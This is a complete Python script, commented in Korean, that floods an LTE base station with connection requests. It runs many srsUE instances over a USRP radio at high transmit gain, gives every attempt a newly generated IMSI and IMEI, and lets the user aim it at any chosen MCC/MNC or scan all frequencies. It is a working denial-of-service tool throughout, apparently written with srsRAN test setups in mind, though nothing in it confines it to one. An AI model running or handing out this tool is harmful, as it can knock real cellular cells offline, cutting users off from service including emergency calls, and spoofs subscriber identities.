#!/usr/bin/env python3
"""
LTE Flooding Script
USRP 장치를 사용하여 srsRAN eNB에 연결 요청을 반복적으로 전송합니다.
"""

import subprocess
import threading
import time
import signal
import sys
import os
import re
from typing import List, Optional
import argparse
import logging
from pathlib import Path

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class LTEFlooder:
    """LTE 연결 요청 flooding을 수행하는 클래스"""
    
    def __init__(self, usrp_args: str, num_instances: int = 10, 
                 interval: float = 0.1, srsue_config: str = "srsue.conf",
                 mcc: Optional[int] = None, mnc: Optional[int] = None,
                 earfcn: Optional[int] = None):
        """
        Args:
            usrp_args: USRP 장치 인자 (예: "serial=30AD123")
            num_instances: 동시에 실행할 srsUE 인스턴스 수
            interval: 각 연결 시도 사이의 간격 (초)
            srsue_config: srsUE 설정 파일 경로
            mcc: Mobile Country Code (예: 123)
            mnc: Mobile Network Code (예: 456)
            earfcn: 주파수 채널 번호 (예: 3400)
        """
        self.usrp_args = usrp_args
        self.num_instances = num_instances
        self.interval = interval
        self.srsue_config = srsue_config
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.processes: List[subprocess.Popen] = []
        self.running = False
        self.threads: List[threading.Thread] = []
        
        # .env 파일에서 USIM 키 로드
        self.usim_opc, self.usim_k = self._load_usim_keys()
        
        # 각 인스턴스별 실행 횟수 카운터 (고유한 IMSI/IMEI 생성을 위해)
        self.instance_counters = {}
        self.counter_lock = threading.Lock()
    
    def _load_usim_keys(self) -> tuple[str, str]:
        """환경변수 또는 .env 파일에서 USIM 키 로드"""
        # 환경변수에서 먼저 확인
        opc = os.getenv('USIM_OPC')
        k = os.getenv('USIM_K')
        
        # .env 파일에서 로드
        env_file = Path('.env')
        if env_file.exists():
            with open(env_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or not line:
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'USIM_OPC' and not opc:
                            opc = value
                        elif key == 'USIM_K' and not k:
                            k = value
        
        # .env 파일이나 환경변수에서 값을 찾지 못한 경우
        if not opc or not k:
            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
            logger.error("예제: .env 파일에 'USIM_OPC=...' 및 'USIM_K=...' 추가")
            raise ValueError("USIM 키가 설정되지 않았습니다. .env 파일을 확인하세요.")
        
        return opc, k
    
    def check_usrp_connection(self) -> bool:
        """USRP 장치 연결 확인"""
        logger.info("USRP 장치 연결 확인 중...")
        
        try:
            # uhd_find_devices로 장치 확인
            result = subprocess.run(
                ["uhd_find_devices"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # 시리얼 번호 추출
            serial_match = re.search(r'serial:\s*([^\s,]+)', result.stdout + result.stderr)
            if serial_match:
                found_serial = serial_match.group(1)
                # 사용자가 지정한 시리얼 추출
                user_serial_match = re.search(r'serial=([^\s"]+)', self.usrp_args)
                user_serial = user_serial_match.group(1) if user_serial_match else None
                
                if user_serial and found_serial.upper() == user_serial.upper():
                    logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                    return True
                elif user_serial:
                    logger.warning(f"지정한 시리얼({user_serial})과 발견된 시리얼({found_serial})이 다릅니다")
                    logger.info(f"발견된 장치 사용: serial={found_serial}")
                    return True
                else:
                    # 시리얼이 지정되지 않았으면 첫 번째 장치 사용
                    logger.info(f"✓ USRP 장치 발견: serial={found_serial}")
                    return True
            
            # srsUE로 직접 확인 시도
            test_config = self.create_ue_config(0, 0)
            test_cmd = [
                "srsue",
                test_config,
                "--log.all_level", "error",
                "--log.filename", "/dev/null"
            ]
            
            test_process = subprocess.Popen(
                test_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # 3초 동안 실행하여 연결 확인
            time.sleep(3)
            
            if test_process.poll() is None:
                # 프로세스가 실행 중이면 연결 성공 가능성
                test_process.terminate()
                test_process.wait(timeout=2)
                logger.info("✓ USRP 장치 연결 확인됨 (srsUE 실행 가능)")
                # 테스트 config 파일 삭제
                if os.path.exists(test_config):
                    os.remove(test_config)
                return True
            else:
                # 프로세스가 종료되었으면 오류 확인
                _, stderr = test_process.communicate()
                if "error" in stderr.lower() or "failed" in stderr.lower():
                    logger.error("✗ USRP 장치 연결 실패")
                    logger.error(f"오류: {stderr[:200]}")
                    # 테스트 config 파일 삭제
                    if os.path.exists(test_config):
                        os.remove(test_config)
                    return False
                else:
                    logger.info("✓ USRP 장치 연결 확인됨")
                    # 테스트 config 파일 삭제
                    if os.path.exists(test_config):
                        os.remove(test_config)
                    return True
                    
        except subprocess.TimeoutExpired:
            logger.warning("USRP 확인 시간 초과")
            return False
        except FileNotFoundError:
            logger.error("✗ srsUE를 찾을 수 없습니다. srsRAN이 설치되어 있는지 확인하세요.")
            return False
        except Exception as e:
            logger.warning(f"USRP 확인 중 오류: {e}")
            return False
        
    def create_ue_config(self, instance_id: int, unique_id: int) -> str:
        """각 인스턴스별 고유한 설정 파일 생성 (재실행마다 새로운 IMSI/IMEI)"""
        # EARFCN 설정 (주파수)
        # 주파수를 지정하지 않고 MCC/MNC만 지정한 경우, 주파수 스캔을 비활성화
        # (srsUE가 자동으로 모든 주파수를 스캔하도록)
        if self.earfcn is not None:
            earfcn_value = self.earfcn
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        elif (self.mcc is not None or self.mnc is not None):
            # MCC/MNC만 지정하고 주파수를 지정하지 않은 경우
            # 주파수 라인을 주석 처리하여 자동 스캔 활성화
            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
            earfcn_value = "자동 스캔"
        else:
            # 둘 다 지정하지 않은 경우 기본값 사용
            earfcn_value = 3400
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        
        # MCC/MNC 설정 (선택사항)
        mcc_mnc_section = ""
        target_info = []
        if self.mcc is not None:
            target_info.append(f"MCC={self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC={self.mnc}")
        
        # target_info 로그는 한 번만 출력하도록 제거 (너무 많이 출력됨)
        # if target_info:
        #     if isinstance(earfcn_value, str):
        #         logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (모든 주파수 자동 스캔)")
        #     else:
        #         logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (주파수: EARFCN {earfcn_value})")
        
        # IMSI 포맷: MCC(3자리) + MNC(2-3자리) + MSIN(나머지, 최대 15자리)
        # unique_id를 사용하여 매번 다른 IMSI 생성
        if self.mcc is not None and self.mnc is not None:
            # 둘 다 지정된 경우
            mnc_digits = 3 if self.mnc >= 100 else 2
            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        elif self.mcc is not None:
            # MCC만 지정된 경우 (MNC는 기본값 01 사용)
            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
            imsi = f"{self.mcc:03d}01{unique_id:010d}"
        elif self.mnc is not None:
            # MNC만 지정된 경우 (MCC는 기본값 001 사용)
            mnc_digits = 3 if self.mnc >= 100 else 2
            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        else:
            # 둘 다 지정되지 않은 경우
            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
            imsi = f"00101{unique_id:010d}"
        
        config_content = f"""[rf]
device_name = uhd
device_args = {self.usrp_args}
tx_gain = 80
rx_gain = 40
nof_antennas = 1

[rat.eutra]
{earfcn_line}
{mcc_mnc_section}
nof_carriers = 1

[usim]
mode = soft
algo = milenage
opc  = {self.usim_opc}
k    = {self.usim_k}
imsi = {imsi}
imei = 353490069873{unique_id:06d}
"""
        config_path = f"srsue_{instance_id}_{unique_id}.conf"
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path
    
    def run_srsue_instance(self, instance_id: int):
        """단일 srsUE 인스턴스 실행 (연결 성공 시 즉시 종료하여 빠른 재연결)"""
        log_file = f"srsue_{instance_id}.log"
        attempt_count = 0
        
        while self.running:
            # 매번 새로운 고유 ID 생성
            with self.counter_lock:
                if instance_id not in self.instance_counters:
                    self.instance_counters[instance_id] = 0
                self.instance_counters[instance_id] += 1
                attempt_count = self.instance_counters[instance_id]
            
            # 고유한 ID 생성: instance_id * 100000 + attempt_count
            unique_id = instance_id * 100000 + attempt_count
            config_path = self.create_ue_config(instance_id, unique_id)
            
            try:
                logger.info(f"[인스턴스 {instance_id}] 시작 중... (시도 {attempt_count})")
                cmd = [
                    "srsue",
                    config_path,
                    "--log.filename", log_file,
                    "--log.all_level", "info"
                ]
                
                # macOS와 Linux 호환성을 위한 프로세스 그룹 설정
                kwargs = {
                    'stdout': subprocess.PIPE,
                    'stderr': subprocess.PIPE,
                }
                # macOS에서는 setsid가 없으므로 조건부로 추가
                if hasattr(os, 'setsid'):
                    kwargs['preexec_fn'] = os.setsid
                elif sys.platform == 'darwin':
                    # macOS에서는 process group을 다르게 처리
                    kwargs['start_new_session'] = False
                
                process = subprocess.Popen(cmd, **kwargs)
                
                self.processes.append(process)
                
                # 연결 성공 감지를 위한 로그 모니터링
                connection_success = False
                enb_found = False
                start_time = time.time()
                max_wait_time = 30  # 최대 30초 대기 (연결 시도 시간)
                last_log_check = start_time
                
                while process.poll() is None and (time.time() - start_time) < max_wait_time:
                    current_time = time.time()
                    elapsed = current_time - start_time
                    
                    # 로그 파일에서 연결 성공 여부 확인
                    if os.path.exists(log_file):
                        try:
                            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                log_content = f.read()
                                
                                # eNB 찾았는지 확인
                                if not enb_found and any(keyword in log_content.lower() for keyword in [
                                    'found cell',
                                    'found plmn',
                                    'detected cell',
                                    'cell found'
                                ]):
                                    enb_found = True
                                    logger.info(f"[인스턴스 {instance_id}] eNB를 찾았습니다! (소요 시간: {elapsed:.1f}초)")
                                
                                # 연결 성공 키워드 확인
                                if any(keyword in log_content.lower() for keyword in [
                                    'rrc connection setup complete',
                                    'rrc connected',
                                    'attached',
                                    'registered'
                                ]):
                                    connection_success = True
                                    logger.info(f"[인스턴스 {instance_id}] 연결 성공했습니다! (소요 시간: {elapsed:.1f}초)")
                                    break
                        except:
                            pass
                    
                    # 5초마다 진행 상황 로그 (너무 많이 출력되지 않도록)
                    if current_time - last_log_check >= 5.0:
                        if not enb_found:
                            logger.debug(f"[인스턴스 {instance_id}] eNB 탐색 중... ({elapsed:.1f}초 경과)")
                        last_log_check = current_time
                    
                    time.sleep(0.5)  # 0.5초마다 로그 확인
                
                # 프로세스가 아직 실행 중이면 종료
                if process.poll() is None:
                    process.terminate()
                    try:
                        process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        process.kill()
                        process.wait()
                
                # 프로세스 종료 후 config 파일 삭제
                if os.path.exists(config_path):
                    try:
                        os.remove(config_path)
                    except:
                        pass
                
                # 결과 로깅
                elapsed_time = time.time() - start_time
                if connection_success:
                    logger.info(f"[인스턴스 {instance_id}] 연결 성공 - 재시작합니다...")
                else:
                    if enb_found:
                        logger.warning(f"[인스턴스 {instance_id}] eNB는 찾았지만 연결에 실패했습니다 (총 소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                    else:
                        logger.warning(f"[인스턴스 {instance_id}] eNB를 찾지 못했습니다 (총 대기 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                
                if self.running:
                    # interval이 0이면 즉시 재시작, 아니면 지정된 간격만큼 대기
                    if self.interval > 0:
                        time.sleep(self.interval)
                    # interval이 0이면 바로 재시작 (대기 없음)
                    
            except Exception as e:
                logger.error(f"UE 인스턴스 {instance_id} 오류: {e}")
                if self.running:
                    if self.interval > 0:
                        time.sleep(self.interval)
    
    def start(self):
        """Flooding 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        # USRP 장치 연결 확인
        if not self.check_usrp_connection():
            logger.error("USRP 장치 연결을 확인할 수 없습니다. 프로그램을 종료합니다.")
            raise RuntimeError("USRP 장치 연결 실패")
        
        self.running = True
        target_info = []
        if self.earfcn is not None:
            target_info.append(f"주파수: EARFCN {self.earfcn}")
        if self.mcc is not None:
            target_info.append(f"MCC: {self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC: {self.mnc}")
        if self.mcc is not None and self.mnc is not None:
            target_info.append(f"(핸드폰 표시: {self.mcc}{self.mnc:02d})")
        
        target_str = ", ".join(target_info) if target_info else "기본 설정"
        logger.info(f"LTE Flooding 시작: {self.num_instances}개 인스턴스, 간격: {self.interval}초, 대상: {target_str}")
        
        # 각 인스턴스에 대한 스레드 생성
        for i in range(self.num_instances):
            thread = threading.Thread(
                target=self.run_srsue_instance,
                args=(i,),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            time.sleep(0.1)  # 인스턴스 시작 간격
        
        logger.info("모든 UE 인스턴스가 시작되었습니다.")
    
    def stop(self):
        """Flooding 중지"""
        if not self.running:
            return
        
        logger.info("LTE Flooding 중지 중...")
        self.running = False
        
        # 모든 프로세스 종료 (macOS와 Linux 호환)
        for process in self.processes:
            try:
                if sys.platform == 'darwin':
                    # macOS에서는 직접 terminate 사용
                    process.terminate()
                elif hasattr(os, 'killpg'):
                    # Linux에서는 프로세스 그룹으로 종료
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except (OSError, ProcessLookupError):
                        process.terminate()
                else:
                    process.terminate()
                
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # 타임아웃 시 강제 종료
                    if sys.platform == 'darwin':
                        process.kill()
                    elif hasattr(os, 'killpg'):
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except (OSError, ProcessLookupError):
                            process.kill()
                    else:
                        process.kill()
                    process.wait()
            except Exception as e:
                logger.error(f"프로세스 종료 오류: {e}")
                try:
                    process.kill()
                except:
                    pass
        
        self.processes.clear()
        
        # 임시 설정 파일 정리 (모든 인스턴스의 config 파일 삭제)
        import glob
        config_pattern = "srsue_*.conf"
        for config_path in glob.glob(config_pattern):
            try:
                os.remove(config_path)
            except:
                pass
        
        logger.info("LTE Flooding이 중지되었습니다.")


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding - USRP를 사용하여 srsRAN eNB에 연결 요청을 반복 전송"
    )
    parser.add_argument(
        "--usrp-args",
        type=str,
        default="serial=30AD123",
        help="USRP 장치 인자 (예: serial=30AD123 또는 type=b200)"
    )
    parser.add_argument(
        "--instances",
        type=int,
        default=10,
        help="동시에 실행할 srsUE 인스턴스 수 (기본값: 10)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="각 연결 시도 사이의 간격(초) (기본값: 0.1)"
    )
    parser.add_argument(
        "--mcc",
        type=int,
        default=None,
        help="Mobile Country Code (예: 123). MCC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--mnc",
        type=int,
        default=None,
        help="Mobile Network Code (예: 456). MNC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--earfcn",
        type=int,
        default=None,
        help="주파수 채널 번호 (EARFCN). 특정 주파수를 지정합니다. (기본값: 3400)"
    )
    
    args = parser.parse_args()
    
    flooder = LTEFlooder(
        usrp_args=args.usrp_args,
        num_instances=args.instances,
        interval=args.interval,
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn
    )
    
    # 시그널 핸들러 설정
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        flooder.start()
        
        # 메인 스레드 대기
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logger.info("\n사용자에 의해 중지됨")
    finally:
        flooder.stop()


if __name__ == "__main__":
    main()

